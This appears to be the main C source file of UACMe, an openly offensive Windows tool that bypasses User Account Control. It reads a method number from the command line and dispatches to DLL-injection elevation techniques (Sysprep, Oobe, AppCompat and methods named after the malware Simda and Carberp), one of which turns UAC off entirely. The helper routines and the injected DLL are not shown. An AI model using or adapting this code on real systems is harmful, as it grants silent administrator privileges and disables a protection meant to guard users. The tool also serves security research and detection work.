/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.20
*
*  DATE:        29 Mar 2015
*
*  Injector entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

#ifdef _WIN64
#include "dll64.h"
#define INJECTDLL dll64
#else
#include "dll32.h"
#define INJECTDLL dll32
#endif

#define PROGRAMTITLE TEXT("UACMe")
#define WOW64STRING TEXT("Apparently it seems you are running under WOW64.\n\r\
This is not supported, run x64 version of this tool.")

/*
* main
*
* Purpose:
*
* Program entry point.
*
*/
VOID main()
{
	BOOL					IsWow64 = FALSE;
	DWORD					bytesIO, dwType;
	WCHAR					szBuffer[MAX_PATH + 1];
	TOKEN_ELEVATION_TYPE	ElevType;
	RTL_OSVERSIONINFOW		osver;


	//verify system version
	RtlSecureZeroMemory(&osver, sizeof(osver));
	osver.dwOSVersionInfoSize = sizeof(osver);
	RtlGetVersion(&osver);

	if (osver.dwBuildNumber < 7000) {

		MessageBox(GetDesktopWindow(),
			TEXT("Unsupported version"), PROGRAMTITLE, MB_ICONINFORMATION);

		goto Done;
	}

	ElevType = TokenElevationTypeDefault;
	if (!supGetElevationType(&ElevType)) {
		goto Done;
	}
	if (ElevType != TokenElevationTypeLimited) {
		MessageBox(GetDesktopWindow(), TEXT("Admin account with limited token required."), 
			PROGRAMTITLE, MB_ICONINFORMATION);
		goto Done;
	}


	IsWow64 = supIsProcess32bit(GetCurrentProcess());

	dwType = 0;
	bytesIO = 0;
	RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
	if (GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO)) {
		if (lstrcmpi(szBuffer, TEXT("1")) == 0) {
			OutputDebugString(TEXT("[UCM] Method Sysprep selected\n\r"));
			dwType = METHOD_SYSPREP;
		}
		if (lstrcmpi(szBuffer, TEXT("2")) == 0) {
			OutputDebugString(TEXT("[UCM] Method Sysprep_ex selected\n\r"));
			dwType = METHOD_SYSPREP_EX;
		}
		if (lstrcmpi(szBuffer, TEXT("3")) == 0) {
			OutputDebugString(TEXT("[UCM] Method Oobe selected\n\r"));
			dwType = METHOD_OOBE;
		}
#ifndef _WIN64
		if (lstrcmpi(szBuffer, TEXT("4")) == 0) {
			OutputDebugString(TEXT("[UCM] Method AppCompat selected\n\r"));
			dwType = METHOD_APPCOMPAT;
		}
#endif
		if (lstrcmpi(szBuffer, TEXT("5")) == 0) {
			OutputDebugString(TEXT("[UCM] Method Simda selected\n\r"));
			dwType = METHOD_SIMDA;
		}
		if (lstrcmpi(szBuffer, TEXT("6")) == 0) {
			OutputDebugString(TEXT("[UCM] Method Carberp selected\n\r"));
			dwType = METHOD_CARBERP;
		}
	}

	if ((dwType == METHOD_SYSPREP_EX) && (osver.dwBuildNumber < 9600)) {
		MessageBox(GetDesktopWindow(), TEXT("This method is only for Windows 8.1 use"), 
			PROGRAMTITLE, MB_ICONINFORMATION);
		goto Done;
	}

	switch (dwType) {

	case METHOD_SYSPREP:
	case METHOD_SYSPREP_EX:
	case METHOD_OOBE:

		//
		// Since we are using injection and not using heavens gate, we should ban usage under wow64.
		//
#ifndef _DEBUG
		if (IsWow64) {
			MessageBoxW(GetDesktopWindow(),
				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
			goto Done;
		}
#endif
		if (ucmStandardAutoElevation(dwType, INJECTDLL, sizeof(INJECTDLL))) {
			OutputDebugString(TEXT("[UCM] Standard AutoElevation method called\n\r"));
		}
		break;

//
//  There is no RedirectEXE for x64.
//
#ifndef _WIN64
	case METHOD_APPCOMPAT:
		if (ucmAppcompatElevation()) {
			OutputDebugString(TEXT("[UCM] AppCompat method called\n\r"));
		}
		break;
#endif
	case METHOD_SIMDA:

		//
		// Since we are using injection and not using heavens gate, we should ban usage under wow64.
		//
#ifndef _DEBUG
		if (IsWow64) {
			MessageBoxW(GetDesktopWindow(),
				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
			goto Done;
		}
#endif
		if (MessageBox(GetDesktopWindow(),
			TEXT("This method will TURN UAC OFF, are you sure? You will need to reenable it after manually."),
			PROGRAMTITLE, MB_ICONQUESTION | MB_YESNO) == IDYES) 
		{
			if (ucmSimdaTurnOffUac()) {
				OutputDebugString(TEXT("[UCM] Simda method called\n\r"));
			}
		}
		break;

	case METHOD_CARBERP:

		if (osver.dwBuildNumber > 9600) {
			MessageBoxW(GetDesktopWindow(),
				TEXT("This method is only for Windows 7/8/8.1"), PROGRAMTITLE, MB_ICONINFORMATION);
			goto Done;		
		}

		//there is no migmiz in syswow64 in 8+
		if ((IsWow64) && (osver.dwBuildNumber > 7601)) {
			MessageBoxW(GetDesktopWindow(),
				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
			goto Done;
		}

		if (ucmWusaMethod(INJECTDLL, sizeof(INJECTDLL))) {
			OutputDebugString(TEXT("[UCM] Carberp method called\n\r"));
		}
		break;
	}

Done:
	ExitProcess(0);
}
